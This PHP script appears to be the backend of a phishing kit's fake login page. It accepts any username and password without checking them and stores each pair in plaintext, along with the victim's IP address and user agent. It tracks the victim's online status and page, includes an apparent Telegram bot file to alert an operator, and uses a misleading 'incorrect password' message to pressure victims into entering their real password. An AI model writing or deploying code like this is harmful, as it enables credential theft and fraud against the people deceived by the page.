<?php
require_once '../php_config/conexionbd.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_POST['usuario'] ?? '';
    $password = $_POST['password'] ?? '';

    if (empty($usuario) || empty($password)) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Usuario y contraseña son requeridos']);
        exit;
    }

    if (!preg_match('/^[a-zA-Z0-9@._\-#$%&*+=\/]{1,80}$/', $usuario)) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'El usuario no tiene un formato válido (máximo 80 caracteres)']);
        exit;
    }

    if (strlen($password) > 20) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'La contraseña no debe exceder los 20 caracteres']);
        exit;
    }

    if (!preg_match('/[^a-zA-Z0-9]/', $password)) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Su contraseña es incorrecta. Verifique que cumpla con el formato requerido e intente nuevamente.']);
        exit;
    }

    function obtenerIPReal() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
            return $_SERVER['HTTP_X_FORWARDED'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
            return $_SERVER['HTTP_FORWARDED'];
        } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
            return $_SERVER['REMOTE_ADDR'];
        }
        return file_get_contents('https://api.ipify.org');
    }

    $ip_cliente = $_POST['ip_cliente'] ?? '';
    $ip_real = !empty($ip_cliente) ? $ip_cliente : obtenerIPReal();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';

    try {
        $pdo = conectarBD();

        $stmt = $pdo->prepare("INSERT INTO usuarios (ip_real, usuarios, password, user_agent) VALUES (?, ?, ?, ?)");
        $stmt->execute([$ip_real, $usuario, $password, $user_agent]);

        $usuario_id = $pdo->lastInsertId();

        $estatusStmt = $pdo->prepare("
            INSERT INTO estatus_usuarios (usuario_id, ip_real, estado, pagina_actual, user_agent)
            VALUES (?, ?, 'online', 'Login', ?)
        ");
        $estatusStmt->execute([$usuario_id, $ip_real, $user_agent]);
        include("bot_tele_login.php");

        session_start();
        $_SESSION['usuario_id'] = $usuario_id;
        $_SESSION['usuario'] = $usuario;
        $_SESSION['ip_real'] = $ip_real;

        require_once __DIR__ . '/../includes/portal_rutas.php';
        $loginUrl = portal_build_login_url((int) $usuario_id, '02');

        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'login' => $loginUrl,
        ]);
        exit;

    } catch (PDOException $e) {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'error' => 'Error de base de datos: ' . $e->getMessage()]);
        exit;
    }
} else {
    header('Location: ../index.php');
    exit;
}
?>
